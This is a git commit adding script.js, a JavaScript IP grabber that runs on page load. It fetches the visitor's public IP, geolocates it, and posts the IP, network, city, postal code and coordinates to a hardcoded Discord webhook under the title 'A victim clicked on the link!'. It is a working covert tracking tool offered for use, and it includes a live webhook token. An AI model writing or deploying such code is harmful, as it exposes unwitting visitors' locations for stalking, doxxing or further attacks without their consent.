3b8f5e9467c016f0ff765b4a09460cf1d472fb58
Anonyme-001 <164770736+Anonyme-00152@users.noreply.github.com>
2025-11-16 16:44:59 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,42 @@
+const sendIP = () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(ipResponse => ipResponse.json())
+        .then(ipData => {
+            const ipadd = ipData.ip;
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+                .then(geoResponse => geoResponse.json())
+                .then(geoData => {
+                    const dscURL = 'https://discord.com/api/webhooks/1439641312541544499/Affw6PorSvgFrc1traHZl6nf-1WsiPrtdUqu4YBGg3R0rlet96peCxYWvRsEYDBqumJD'; // replace with your webhook url
+                    return fetch(dscURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            username: "DEDE site logger (LC4-vg)", // optionally changeable
+                            avatar_url: "https://i.pinimg.com/236x/d0/00/72/d0007257ad9177555d72f6de823f2d56.jpg", // optionally changeable
+                            content: `@here`,
+                            embeds: [
+                                {
+                                    title: 'A victim clicked on the link!',
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    color: 0x0000FF // optionally changeable
+                                }
+                            ]
+                        })
+                    });
+                });
+        })
+        .then(dscResponse => {  
+            if (dscResponse.ok) {
+                console.log('Sent! <3');
+            } else {
+                console.log('Failed :(');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            console.log('Error :(');
+        });
+};
+sendIP();
